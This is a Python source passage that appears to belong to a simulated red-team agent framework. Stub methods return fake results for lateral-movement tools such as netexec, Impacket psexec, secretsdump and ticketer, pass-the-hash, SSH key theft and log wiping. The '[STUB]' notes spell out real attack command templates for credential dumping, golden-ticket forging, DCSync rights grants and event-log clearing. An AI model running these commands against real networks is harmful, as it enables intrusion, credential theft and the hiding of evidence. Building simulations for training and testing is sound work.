            "auth_success": True,
            "admin_share_access": True,
            "local_admin": True,
            "pivot_successful": True,
            "compromised_hosts": [{"ip": target, "hostname": "SQL01", "access_level": "SYSTEM"}],
            "note": f"[STUB] netexec smb {target} -u {cred_user} -H <hash> -x 'cmd'",
        }

    @staticmethod
    def _sim_netexec_wmi(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "netexec_wmi", "target": target,
            "auth_success": True, "execution_success": True,
            "output": "Microsoft Windows [Version 10.0.17763.0]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nnt authority\\system",
            "pivot_successful": True,
            "shell_obtained": True,
            "note": "[STUB] netexec wmi <target> -u <user> -H <hash>",
        }

    @staticmethod
    def _sim_netexec_winrm(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "netexec_winrm", "target": target,
            "auth_success": True, "shell_obtained": True, "pivot_successful": True,
            "note": "[STUB] netexec winrm <target> -u <user> -p <password>",
        }

    @staticmethod
    def _sim_smbmap_scan(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.10")
        return {
            "simulated": True,
            "tool": "smbmap_scan",
            "target": target,
            "shares": [
                {"name": "ADMIN$", "permissions": "READ", "type": "Default Admin Share"},
                {"name": "C$", "permissions": "READ,WRITE", "type": "Default Drive Share"},
                {"name": "NETLOGON", "permissions": "READ", "type": "Domain Share"},
                {"name": "SYSVOL", "permissions": "READ", "type": "Domain Share"},
                {"name": "IT_Share", "permissions": "READ,WRITE", "type": "Custom Share"},
                {"name": "HR_Documents", "permissions": "READ", "type": "Custom Share"},
            ],
            "writable_shares": ["C$", "IT_Share"],
            "note": "[STUB] smbmap -H <target> -u <user> -p <password>",
        }

    @staticmethod
    def _sim_smbmap_exec(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        command = params.get("command", "whoami")
        return {
            "simulated": True, "tool": "smbmap_exec", "target": target,
            "command": command, "output": "nt authority\\system",
            "pivot_successful": True,
            "note": "[STUB] smbmap -H <target> -u <user> -p <password> -x 'command'",
        }

    @staticmethod
    def _sim_enum4linux(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.10")
        return {
            "simulated": True,
            "tool": "enum4linux",
            "target": target,
            "os_info": "Windows Server 2022 Standard 10.0.20348",
            "domain": "CORP",
            "users": [
                {"rid": 500, "username": "Administrator"},
                {"rid": 501, "username": "Guest"},
                {"rid": 502, "username": "krbtgt"},
                {"rid": 1103, "username": "jdoe"},
                {"rid": 1104, "username": "asmith"},
                {"rid": 1105, "username": "svc_sql"},
                {"rid": 1106, "username": "HELPdesk"},
            ],
            "groups": ["Domain Admins", "Domain Users", "Enterprise Admins", "Schema Admins"],
            "password_policy": {"min_length": 8, "lockout_threshold": 5, "complexity": True},
            "note": "[STUB] enum4linux -a <target>",
        }

    @staticmethod
    def _sim_rpcclient(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.10")
        return {
            "simulated": True,
            "tool": "rpcclient",
            "target": target,
            "domain": "CORP",
            "users_enumerated": 47,
            "groups_enumerated": 12,
            "lsa_query_info": {"domain": "CORP", "sid": "S-1-5-21-1004336348-1177238915-682003330"},
            "discovered_hosts": [{"ip": target, "hostname": "DC01", "role": "Domain Controller"}],
            "note": "[STUB] rpcclient -U '<user>%<password>' <target>",
        }

    # --- Impacket ----------------------------------------------------------

    @staticmethod
    def _sim_impacket_psexec(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "impacket_psexec", "target": target,
            "auth_success": True, "shell_obtained": True, "access_level": "SYSTEM",
            "pivot_successful": True,
            "compromised_hosts": [{"ip": target, "hostname": "SQL01", "access_level": "SYSTEM"}],
            "sessions": [{"target": target, "type": "psexec", "access_level": "SYSTEM"}],
            "note": "[STUB] impacket-psexec.py <domain>/<user>:<hash>@<target>",
        }

    @staticmethod
    def _sim_impacket_smbexec(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "impacket_smbexec", "target": target,
            "auth_success": True, "shell_obtained": True, "pivot_successful": True,
            "note": "[STUB] impacket-smbexec.py <domain>/<user>:<hash>@<target>",
        }

    @staticmethod
    def _sim_impacket_wmiexec(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "impacket_wmiexec", "target": target,
            "auth_success": True, "shell_obtained": True, "pivot_successful": True,
            "note": "[STUB] impacket-wmiexec.py <domain>/<user>:<hash>@<target>",
        }

    @staticmethod
    def _sim_impacket_secretsdump(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.10")
        return {
            "simulated": True,
            "tool": "impacket_secretsdump",
            "target": target,
            "discovered_creds": [
                {"user": "Administrator", "ntlm_hash": "8846f7eaee8fb117ad06bdd830b7586c", "domain": "CORP"},
                {"user": "jdoe", "ntlm_hash": "259745cb123a52aa2e693aaacca2db52", "domain": "CORP"},
                {"user": "svc_sql", "ntlm_hash": "64f12cddaa88057e06a81b54e73b949b", "domain": "CORP"},
            ],
            "sam_dumped": True,
            "lsa_secrets": [
                {"name": "DPAPI_SYSTEM", "value": "01 00 00 00 ..."},
                {"name": "$MACHINE.ACC", "value": "3c:...:45"},
            ],
            "note": "[STUB] impacket-secretsdump.py <domain>/<user>:<hash>@<target>",
        }

    @staticmethod
    def _sim_impacket_get_tgt(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "impacket_get_tgt",
            "user": params.get("username", "svc_sql"),
            "domain": "corp.local",
            "tgt_obtained": True,
            "ticket_file": "/tmp/svc_sql.ccache",
            "note": "[STUB] impacket-getTGT.py <domain>/<user> -hashes <hash>",
        }

    @staticmethod
    def _sim_impacket_get_st(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "impacket_get_st",
            "service": params.get("spn", "CIFS/DC01.corp.local"),
            "tgs_obtained": True,
            "ticket_file": "/tmp/svc_sql_cifs.ccache",
            "note": "[STUB] impacket-getST.py <domain>/<user> -spn <spn> -hashes <hash>",
        }

    @staticmethod
    def _sim_impacket_ticketer(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "impacket_ticketer",
            "ticket_type": params.get("ticket_type", "golden"),
            "domain": "corp.local",
            "domain_sid": "S-1-5-21-1004336348-1177238915-682003330",
            "ticket_created": True,
            "ticket_file": "/tmp/Administrator_golden.ccache",
            "note": "[STUB] impacket-ticketer.py -domain-sid <sid> -domain <domain> -nthash <krbtgt> Administrator",
        }

    @staticmethod
    def _sim_impacket_dacledit(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target_dn", "DC=corp,DC=local")
        return {
            "simulated": True, "tool": "impacket_dacledit",
            "target": target,
            "rights_granted": ["GenericAll", "WriteDacl"],
            "principal": params.get("principal", "jdoe"),
            "note": "[STUB] impacket-dacledit.py <domain>/<user> -target-dn <dn> -rights DCSync -principal <user>",
        }

    @staticmethod
    def _sim_impacket_owneredit(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target_dn", "DC=corp,DC=local")
        return {
            "simulated": True, "tool": "impacket_owneredit",
            "target": target, "new_owner": params.get("new_owner", "jdoe"),
            "ownership_changed": True,
            "note": "[STUB] impacket-owneredit.py <domain>/<user> -target-dn <dn> -new-owner <user>",
        }

    # --- Credential Pivoting -----------------------------------------------

    @staticmethod
    def _sim_pass_the_hash(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "pass_the_hash", "target": target,
            "auth_success": True, "access_level": "SYSTEM",
            "pivot_successful": True,
            "compromised_hosts": [{"ip": target, "hostname": "SQL01", "access_level": "SYSTEM"}],
            "sessions": [{"target": target, "type": "pth", "access_level": "SYSTEM"}],
            "note": f"[STUB] Pass-the-Hash: SMB auth to {target} using NTLM hash",
        }

    @staticmethod
    def _sim_pass_the_ticket(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "DC01.corp.local")
        return {
            "simulated": True, "tool": "pass_the_ticket", "target": target,
            "auth_success": True, "pivot_successful": True,
            "ticket_cache": "/tmp/krb5cc_0",
            "compromised_hosts": [{"hostname": "DC01", "ip": "192.168.1.10", "access_level": "Domain Admin"}],
            "domain_admin_obtained": True,
            "note": f"[STUB] Pass-the-Ticket: KRB auth to {target} with imported ccache",
        }

    @staticmethod
    def _sim_overpass_the_hash(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "overpass_the_hash", "target": target,
            "tgt_obtained": True, "pivot_successful": True,
            "note": "[STUB] Overpass-the-Hash: request TGT with NTLM hash, then PTK",
        }

    @staticmethod
    def _sim_kerberos_ticket_forge(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "kerberos_ticket_forge",
            "ticket_type": params.get("ticket_type", "silver"),
            "ticket_created": True,
            "note": "[STUB] Forge Kerberos TGT/TGS using known hashes",
        }

    # --- SSH / Unix Pivoting -----------------------------------------------

    @staticmethod
    def _sim_ssh_agent_forward(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "10.0.1.50")
        return {
            "simulated": True, "tool": "ssh_agent_forward", "target": target,
            "auth_success": True, "shell_obtained": True, "pivot_successful": True,
            "note": "[STUB] SSH agent forwarding: ssh -A user@<target>",
        }

    @staticmethod
    def _sim_ssh_key_theft(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "ssh_key_theft",
            "discovered_creds": [
                {"type": "ssh_key", "user": "root", "path": "/root/.ssh/id_ed25519", "encrypted": False},
                {"type": "ssh_key", "user": "deploy", "path": "/home/deploy/.ssh/id_rsa", "encrypted": True},
            ],
            "authorized_keys_entries": [
                {"user": "root", "key_type": "ssh-ed25519", "comment": "admin@bastion"},
            ],
            "note": "[STUB] SSH key theft: enumerate ~/.ssh/id_* on compromised host",
        }

    @staticmethod
    def _sim_ssh_tunnel(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "10.0.2.100")
        local_port = params.get("local_port", 1080)
        return {
            "simulated": True, "tool": "ssh_tunnel",
            "target": target, "local_port": local_port,
            "tunnel_established": True,
            "tunnel_type": params.get("tunnel_type", "dynamic"),
            "note": f"[STUB] SSH tunnel: ssh -D {local_port} -N user@{target}",
        }

    # --- Protocol Abuse -----------------------------------------------------

    @staticmethod
    def _sim_wmi_exec(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        command = params.get("command", "whoami")
        return {
            "simulated": True, "tool": "wmi_exec", "target": target,
            "command": command, "output": "corp\\Administrator",
            "pivot_successful": True,
            "note": "[STUB] wmiexec: Invoke-WmiMethod Win32_Process Create",
        }

    @staticmethod
    def _sim_psexec(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "psexec", "target": target,
            "shell_obtained": True, "access_level": "SYSTEM", "pivot_successful": True,
            "note": "[STUB] psexec: upload PsExecSvc, create service, start, connect",
        }

    @staticmethod
    def _sim_winrm_exec(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "winrm_exec", "target": target,
            "shell_obtained": True, "pivot_successful": True,
            "note": "[STUB] WinRM: New-PSSession, Invoke-Command, Enter-PSSession",
        }

    @staticmethod
    def _sim_rdp_pivot(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "rdp_pivot", "target": target,
            "auth_success": True,
            "restricted_admin_mode": True,
            "note": "[STUB] RDP pivot: xfreerdp /restricted-admin /u:<user> /pth:<hash> /v:<target>",
        }

    # --- Network Mapping ---------------------------------------------------

    @staticmethod
    def _sim_network_map(params: Dict[str, Any]) -> Dict[str, Any]:
        sources = params.get("sources", [])
        return {
            "simulated": True,
            "tool": "network_map",
            "sources": sources,
            "topology": {
                "subnets": ["192.168.1.0/24", "10.0.1.0/24", "172.16.0.0/24"],
                "gateways": {"192.168.1.1": "192.168.1.0/24", "10.0.1.1": "10.0.1.0/24"},
            },
            "discovered_hosts": [
                {"ip": "10.0.1.10", "hostname": "APP01", "os": "Ubuntu 22.04", "reachable_from": sources[0] if sources else "unknown"},
                {"ip": "10.0.1.11", "hostname": "MON01", "os": "Ubuntu 20.04", "reachable_from": sources[0] if sources else "unknown"},
                {"ip": "172.16.0.5", "hostname": "PAYROLL", "os": "Windows Server 2016", "reachable_from": sources[0] if sources else "unknown"},
            ],
            "movement_paths": [
                {"source": sources[0] if sources else "unknown", "target": "10.0.1.10", "technique": "ssh_agent_forward"},
                {"source": sources[0] if sources else "unknown", "target": "172.16.0.5", "technique": "pass_the_hash"},
            ],
            "note": "[STUB] Network map: ARP cache, routing table, netstat on compromised hosts",
        }

    @staticmethod
    def _sim_host_enum(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "")
        return {
            "simulated": True, "tool": "host_enum", "target": target,
            "hostname": "SQL01", "os": "Windows Server 2019", "domain": "CORP",
            "local_users": ["Administrator", "Guest", "sqladmin"],
            "local_groups": ["Administrators", "Remote Desktop Users"],
            "running_processes": ["sqlservr.exe", "lsass.exe", "svchost.exe (RDP)"],
            "network_interfaces": [{"name": "Ethernet0", "ip": "192.168.1.20", "subnet": "255.255.255.0"}],
            "discovered_services": [
                {"port": 1433, "proto": "tcp", "service": "mssql"},
                {"port": 3389, "proto": "tcp", "service": "rdp"},
                {"port": 445, "proto": "tcp", "service": "smb"},
                {"port": 5985, "proto": "tcp", "service": "winrm"},
            ],
            "note": "[STUB] Host enumeration via shell commands on compromised host",
        }

    @staticmethod
    def _sim_share_enum(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "share_enum", "target": target,
            "shares": ["ADMIN$", "C$", "IPC$", "SQLBackup", "DeploymentScripts"],
            "note": "[STUB] Share enumeration via net view \\\\<target>",
        }

    @staticmethod
    def _sim_session_enum(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "session_enum",
            "active_sessions": [
                {"user": "Administrator", "source": "192.168.1.50", "target": "DC01", "type": "RDP"},
                {"user": "jdoe", "source": "192.168.1.20", "target": "FILE01", "type": "SMB"},
            ],
            "note": "[STUB] Session enumeration via net session or BloodHound Session collection",
        }

    # --- Defense Evasion ----------------------------------------------------

    @staticmethod
    def _sim_token_impersonate(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True, "tool": "token_impersonate",
            "token_user": params.get("target_user", "Administrator"),
            "impersonation_successful": True, "new_context": "CORP\\Administrator",
            "note": "[STUB] Token impersonation via SeImpersonatePrivilege or named pipe",
        }

    @staticmethod
    def _sim_token_steal(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True, "tool": "token_steal",
            "pid": params.get("pid", 1234), "token_stolen": True,
            "note": "[STUB] Token theft via OpenProcess + DuplicateTokenEx",
        }

    @staticmethod
    def _sim_log_wipe_lateral(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        return {
            "simulated": True, "tool": "log_wipe_lateral", "target": target,
            "logs_cleared": ["Security", "System", "Windows PowerShell"],
            "timestamps_corrected": True,
            "note": "[STUB] Lateral log wipe: wevtutil cl + timestamp restore",
        }

    # ------------------------------------------------------------------
    # Status override — enriches the base report with lateral-move data
    # ------------------------------------------------------------------

    def report_status(self) -> Dict[str, Any]:
        base = super().report_status()
        base["movement_paths_count"] = len(self._movement_paths)
        base["network_mapped_subnets"] = len(self._network_map)
        base["active_pivots"] = len(self._active_pivots)
        base["trust_graph_edges"] = sum(len(v) for v in self._trust_graph.values())
        return base
